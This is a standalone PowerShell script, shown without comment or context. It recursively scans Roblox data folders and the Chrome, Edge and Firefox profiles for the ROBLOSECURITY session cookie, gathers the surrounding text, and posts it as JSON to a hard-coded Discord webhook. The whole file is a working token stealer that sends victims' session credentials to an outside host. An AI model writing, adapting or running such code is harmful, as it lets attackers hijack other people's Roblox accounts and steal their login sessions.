$w='https://discord.com/api/webhooks/1538403770965426247/cKkhSXToyltnfneUV1D1q8kV1Y3KpH_iUXK8rgozjvNOtKQjXWxBj-l9EZDLdmPI-AEL';
$rbx = @();
$robPaths = @("$env:LOCALAPPDATA\Roblox", "$env:APPDATA\Roblox");
foreach($rp in $robPaths){
    if(Test-Path $rp){
        Get-ChildItem $rp -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;
            if($content -match 'ROBLOSECURITY'){
                $lines = $content -split "`n";
                foreach($line in $lines){
                    if($line -match 'ROBLOSECURITY'){
                        $rbx += "$($_.FullName): $line";
                    }
                }
            }
        }
    }
}
$browserRoots = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
);
foreach($br in $browserRoots){
    if(Test-Path $br){
        Get-ChildItem $br -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            if($_.Length -lt 10MB){
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName);
                $text = [System.Text.Encoding]::UTF8.GetString($bytes);
                if($text -match 'ROBLOSECURITY'){
                    $idx = $text.IndexOf('ROBLOSECURITY');
                    $start = [Math]::Max(0, $idx-100);
                    $len = [Math]::Min(500, $text.Length-$start);
                    $context = $text.Substring($start, $len);
                    $rbx += "$($_.FullName): $context";
                }
            }
        }
    }
}
$msg = "Roblox Session: " + (if($rbx.Count){$rbx -join ' | '}else{'none'});
$payload=@{content=$msg}|ConvertTo-Json;
Invoke-RestMethod -Uri $w -Method Post -ContentType 'application/json' -Body $payload
